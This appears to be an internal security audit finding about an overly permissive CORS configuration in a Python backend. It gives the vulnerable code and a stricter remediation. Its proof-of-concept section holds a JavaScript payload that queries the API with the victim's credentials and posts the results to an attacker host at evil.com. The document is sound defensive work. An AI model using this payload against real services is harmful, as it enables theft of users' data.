# SEC-004: Overly Permissive CORS Configuration

## Severity: HIGH
## CVSS Score: 7.1
## CWE: CWE-942 (Permissive Cross-domain Policy)

---

## Location

| File | Line | Function |
|------|------|----------|
| `backend/src/api.py` | 27-36 | `configure_cors()` |

---

## Description

The CORS configuration uses wildcards for methods and headers, and allows credentials. Combined with the lack of authentication, this enables cross-site request attacks from any malicious website.

---

## Vulnerable Code

```python
def configure_cors() -> None:
    """Configure CORS middleware."""
    settings = get_settings()
    app.add_middleware(
        CORSMiddleware,
        allow_origins=settings.cors_origins,  # Configurable, but...
        allow_credentials=True,               # Allows cookies/auth
        allow_methods=["*"],                  # All methods allowed
        allow_headers=["*"],                  # All headers allowed
    )
```

---

## Proof of Concept

```html
<!-- Malicious website at evil.com -->
<script>
// If user is on same network or localhost:3000 is in allowed origins
fetch('http://localhost:8000/api/chat/sync', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',  // Send cookies if any
  body: JSON.stringify({message: 'Show all customer data'})
})
.then(r => r.json())
.then(data => {
  // Exfiltrate data to attacker server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

---

## Impact

1. **Cross-Site Data Theft**: Malicious sites can query the API on behalf of users
2. **CSRF Attacks**: If authentication is added, credentials could be reused
3. **Data Exfiltration**: Business data stolen via victim's browser

---

## Remediation

### Strict CORS Policy

```python
def configure_cors() -> None:
    settings = get_settings()

    # Only allow specific origins
    allowed_origins = settings.cors_origins

    # Validate origins are legitimate
    for origin in allowed_origins:
        if '*' in origin:
            raise ValueError("Wildcard origins not allowed")

    app.add_middleware(
        CORSMiddleware,
        allow_origins=allowed_origins,
        allow_credentials=False,  # Don't allow credentials unless needed
        allow_methods=["GET", "POST"],  # Only needed methods
        allow_headers=["Content-Type", "Authorization"],  # Only needed headers
        max_age=600,  # Cache preflight for 10 minutes
    )
```

### Production Configuration

```python
# config.py
cors_origins: list[str] = Field(
    default=[],
    description="Allowed CORS origins (no wildcards in production)",
)

# Validate in production
if settings.environment == "production":
    if not settings.cors_origins:
        raise ValueError("CORS origins must be explicitly set in production")
    if "localhost" in str(settings.cors_origins):
        raise ValueError("localhost not allowed in production CORS")
```

---

## Effort: LOW
## Priority: URGENT (72 hours)

---

## References

- https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
- https://cwe.mitre.org/data/definitions/942.html
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
